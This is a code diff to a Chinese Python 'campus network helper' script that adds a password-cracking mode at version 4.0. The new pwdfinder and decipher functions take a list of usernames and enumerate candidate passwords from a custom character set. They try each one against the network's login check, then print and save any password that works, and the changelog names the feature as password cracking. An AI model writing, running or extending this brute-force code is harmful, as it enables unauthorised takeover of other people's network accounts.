@@ -22,25 +22,26 @@ def advancedio():
             for inputfile in sys.argv[3:]:
                 inputlist.append(inputfile)
             csvcombiner(inputlist, output=sys.argv[2])
-        else: #命令行开启时，如果没有特殊argument，进入正常模式
+        else: #命令行开启时，有额外但非特殊argument，进入正常模式
             main()
 
 def main():
     clear()
     print("""
-==校园网小助手简体中文威力加强免安装绿色版 V3.11==
+==校园网小助手简体中文威力加强免安装绿色版 V4.0==
 
 I/i/info     - 版本信息
 H/h/help     - 帮助信息
-
 T/t/tester   - 网络测试
-L/l/loginer  - 基本登录
+
+L/l/loginer  - 旧版登录
 N/n/nloginer - 新版登录
 P/p/ploginer - 手动登录
 
-F/f/finder   - 手动搜索
-A/a/auto     - 自动搜索
+F/f/finder   - 用户搜索
+D/d/decipher - 密码搜索
 C/c/csvio    - 表格交互
+A/a/auto     - 自动模式
 
 Q/q/quit     - 退出
     """)
@@ -52,6 +53,8 @@ Q/q/quit     - 退出
         helper()
     elif command.lower() in ['f', "finder"]:
         finder()
+    elif command.lower() in ['d', "decipher"]:
+        decipher()
     elif command.lower() in ['l', "loginer"]:
         loginer()
     elif command.lower() in ['n', "nloginer"]:
@@ -348,6 +351,39 @@ def traditionfinder(start, end, charlist):
     log.close()
     return
 
+#遍历密码工具函数
+
+def pwdfinder(username,start,end,charlist):
+    log = open("log.txt", "w")
+
+    for n in range(start, end):
+
+        pwd = namemaker(n, charlist)
+        if '\n' not in pwd:
+            result = searcher(username, pwd)
+
+            # 进度条显示
+            percent = 1.0 * (n - start + 1) / (end - start)
+            sys.stdout.write("\r{0}进度 {1}{2}{3}".format(username + "-",
+                                                        "|" * int(percent // 0.05),
+                                                        '%.2f%%' % (percent * 100),
+                                                        " (" + pwd + ")"))
+            sys.stdout.flush()
+
+            if result[0] == True and result[1] == 'OK':  # 如果成功
+                quitter()
+                print('\n[成功] ' + username + '|' + pwd)
+                print(datetime.datetime.now().strftime('%Y-%m-%d-%H-%M'))
+                log.close()
+                return pwd
+
+            log.write(str(n) + "-" + pwd + "\n")
+
+    print('\n[失败]' + username)
+    print(datetime.datetime.now().strftime('%Y-%m-%d-%H-%M'))
+    log.close()
+    return '404notFound'
+
 #用户交互函数
 
 def finder():
@@ -429,6 +465,48 @@ C/c - 自定义模式，输入自定义字符串（测试功能）
     else:
         print("==开始运行，网络断开==")
         traditionfinder(start,end,charlist)
+    return
+
+def decipher():
+    clear()
+    print("""
+==密码搜索器 V1.0==
+
+原理等同用户名搜索器的传统遍历模式
+
+先输入一个用户名列表
+然后输入需要遍历的字符串
+
+输出结果包括一个log文件和一个csv文件
+log文件 - 记录运行状态，用于检查出现问题的位置
+csv文件 - 记录始末位置，保存尝试结果
+        """)
+    start = int(input('请输入开始参数：'))
+    end = int(input('请输入结束参数：'))
+    charstr = '\n' + input("请输入要尝试的字符串：")
+
+    userlist=[] #用户名列表
+    stoper=''
+    while stoper == '':
+        userlist.append(input("请输入用户名："))
+        stoper = input("输入任意内容以结束录入，否则继续：")
+
+    charlist = list(charstr)
+    print("==运行参数==" +
+          "\n从" + str(start) + '到' + str(end) +
+          "\n字符串为：" + charstr[1:] +
+          "\n用户名列表：" + str(userlist))
+    if input("输入N/n返回搜索器，否则继续：").lower() == 'n':
+        return
+    else:
+        print("==开始运行，网络断开==")
+        filename = 'record_pwd_' + charstr[1:] + '_' + str(start) + 'to' + str(end) + \
+                   "_" + datetime.datetime.now().strftime('%Y-%m-%d-%H-%M') + '.csv'
+        recorder_init(filename)
+        recorder(filename,str(list(namemaker(start, charlist))),
+                 str(list(namemaker(end, charlist))),"start&end") #记录始末
+        for username in userlist:
+            recorder(filename,username,pwdfinder(username,start,end,charlist))
     return
 
 def loginer():
@@ -634,7 +712,7 @@ def newloginer(mode):
 def ploginer():
     clear()
     command = input("""
-==个人登录器读取与存储 V1.0==
+==个人登录器读取与存储 V1.1==
 
 存储给定的账号密码，以方便自动登录
 每次录入会覆盖之前录入的信息
@@ -645,8 +723,8 @@ L/l/load - 读取登录
 请输入指令：""")
     if command.lower() in ['s','save']:
         recorder_init('.personal.csv')
-        stoper='\n'
-        while stoper=='\n':
+        stoper=''
+        while stoper == '':
             recorder('.personal.csv',input("请输入用户名："),input("请输入密码："),'manual_input')
             stoper = input("输入任意内容以结束录入，否则继续：")
         ploginer()
@@ -762,6 +840,8 @@ V3.00 - 20190626
     增加普通模式，输入开发者模式密码以进入完全版
 V3.10 - 20190626
     增加手动登录模式，可以录入和读取信息
+V4.00 - 20190627
+    增加密码破解模式
 
 【用户名搜索器】
 V1.0 - 20190625
@@ -778,6 +858,10 @@ V2.1 - 20190626
     加强了传统遍历模式，能够搜索更大量的信息
 V2.2 - 20190626
     传统模式定制化改进，可以进行基本和进阶搜索
+
+【密码搜索器】
+V1.0 - 20190627
+    完全自定义密码搜索器
 
 【自动登录器】
 V0.5 - 20190103
